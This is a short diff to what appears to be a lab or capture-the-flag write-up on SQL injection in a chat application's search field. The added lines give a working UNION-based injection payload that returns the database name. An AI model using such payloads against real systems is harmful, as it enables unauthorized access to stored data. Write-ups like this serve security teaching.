@@ -52,8 +52,13 @@ Explanation:
 
 The "search in conversation" input field uses a GET request to retrieve messages in the database. This represents a potential injection point.
 
+To find the database name we can use the injection:
 
+    ') UNION SELECT 1, 2, 3, database() FROM INFORMATION_SCHEMA.SCHEMATA #
 
+- This returns: chattr
+
+<img width="1223" height="461" alt="chattr" src="https://github.com/user-attachments/assets/ead424ef-36e2-4042-ae94-bc4497f9f337" />
 
 
 
